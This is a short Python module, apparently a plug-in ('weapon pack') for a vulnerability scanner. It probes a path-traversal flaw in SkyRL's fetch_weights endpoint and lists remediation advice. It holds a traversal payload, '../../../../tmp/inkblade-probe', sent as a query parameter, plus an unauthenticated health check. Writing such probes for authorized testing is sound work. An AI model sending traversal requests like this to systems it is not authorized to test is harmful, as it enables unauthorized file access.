"""Weapon pack skyrl-fetch-weights-traversal: SkyRL fetch_weights Path Traversal."""
from __future__ import annotations

import importlib.util
from pathlib import Path

KEY = "skyrl-fetch-weights-traversal"
ROUTES = [
        {
                "name": "weights status",
                "method": "GET",
                "path": "/health",
                "expect": 200,
                "sev": "medium",
                "fix": "Require auth on the SkyRL rollout worker."
        },
        {
                "name": "traversal fetch",
                "method": "GET",
                "path": "/fetch_weights?payload_files=../../../../tmp/inkblade-probe",
                "expect": 200,
                "sev": "high",
                "fix": "Resolve payload_files under cache_dir with Path.resolve/relative_to."
        }
]


def _load_common():
    path = Path(__file__).resolve().parent.parent / "_reserve-common.py"
    spec = importlib.util.spec_from_file_location(f"_reserve_common_{KEY.replace('-', '_')}", path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


_COMMON = _load_common()


def run(ctx: dict, params: dict) -> dict:
    return _COMMON.http_probe(ctx, KEY, params, routes=ROUTES)
